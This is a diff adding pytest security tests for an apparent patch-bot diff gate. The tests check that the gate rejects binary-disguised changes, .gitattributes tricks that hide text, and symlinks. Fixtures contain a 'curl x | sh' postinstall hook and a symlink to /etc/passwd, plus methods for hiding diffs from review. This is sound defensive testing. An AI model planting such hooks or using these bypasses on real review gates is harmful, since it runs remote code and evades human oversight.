@@ -260,3 +260,77 @@ def test_added_line_that_looks_like_a_file_header_does_not_hijack_attribution(tm
     assert '"postinstall"' in changed["package.json"].added_text
     assert "postinstall" not in changed["README.md"].added_text
     worktrees.release(path)
+
+
+# --- security: diff-gate bypasses via binary diffs, attributes and symlinks (review C-2) ---
+
+
+def _gate(worktrees, path):
+    from research.diff_gate import check_diff
+
+    check_diff(worktrees.diff(path))
+
+
+def test_binary_change_is_rejected_instead_of_counted_as_zero_lines(tmp_path, remote):
+    from research.diff_gate import DiffRejected
+
+    remotes, _ = remote
+    worktrees = _branch_worktrees(tmp_path, remotes)
+    path, _ = worktrees.create("westcoder/mdb", "main", "patchbot/x-1")
+    # A NUL byte makes git report the file as binary: numstat "-\t-", no "+" lines in the patch.
+    (path / "package.json").write_bytes(b'{"name": "mdb",\x00\n"scripts": {"postinstall": "curl x | sh"}}\n')
+    with pytest.raises(DiffRejected, match="Binär"):
+        worktrees.diff(path)
+    worktrees.release(path)
+
+
+@pytest.mark.parametrize("attributes", ["package.json -diff\n", "package.json binary\n", "* -diff\n"])
+def test_worktree_gitattributes_cannot_hide_changes_from_the_gate(tmp_path, remote, attributes):
+    from research.diff_gate import DiffRejected
+
+    remotes, _ = remote
+    worktrees = _branch_worktrees(tmp_path, remotes)
+    path, _ = worktrees.create("westcoder/mdb", "main", "patchbot/x-1")
+    (path / ".gitattributes").write_text(attributes)
+    (path / "package.json").write_text('{"name": "mdb",\n"scripts": {"postinstall": "curl x | sh"}}\n')
+    with pytest.raises(DiffRejected):
+        _gate(worktrees, path)
+    # The text the gate sees must be the real text, whatever the worktree attributes say.
+    changed = {c.path: c for c in worktrees.diff(path)}
+    assert '"postinstall"' in changed["package.json"].added_text
+    assert changed["package.json"].added_lines == 2
+    worktrees.release(path)
+
+
+def test_committed_gitattributes_do_not_turn_text_changes_into_zero_line_diffs(tmp_path, remote):
+    """Attributes already on the default branch: the gate still sees the real text."""
+    from research.diff_gate import DiffRejected
+
+    remotes, origin = remote
+    (origin / ".gitattributes").write_text("*.json -diff\n")
+    _git("add", ".", cwd=origin)
+    _git("commit", "-q", "-m", "attrs", cwd=origin)
+    worktrees = _branch_worktrees(tmp_path, remotes)
+    path, _ = worktrees.create("westcoder/mdb", "main", "patchbot/x-1")
+    (path / "package.json").write_text('{"name": "mdb",\n"scripts": {"postinstall": "curl x | sh"}}\n')
+    changed = {c.path: c for c in worktrees.diff(path)}
+    assert '"postinstall"' in changed["package.json"].added_text
+    with pytest.raises(DiffRejected):
+        _gate(worktrees, path)
+    worktrees.release(path)
+
+
+@pytest.mark.parametrize("target", ["/etc/passwd", "../package.json"])
+def test_symlinks_are_rejected_like_submodules(tmp_path, remote, target):
+    from research.diff_gate import DiffRejected
+
+    remotes, _ = remote
+    worktrees = _branch_worktrees(tmp_path, remotes)
+    path, _ = worktrees.create("westcoder/mdb", "main", "patchbot/x-1")
+    (path / "src").mkdir()
+    (path / "src" / "link").symlink_to(target)
+    with pytest.raises(DiffRejected, match="Symlink"):
+        worktrees.diff(path)
+    with pytest.raises(DiffRejected, match="Symlink"):
+        worktrees.commit_all(path, "msg")
+    worktrees.release(path)
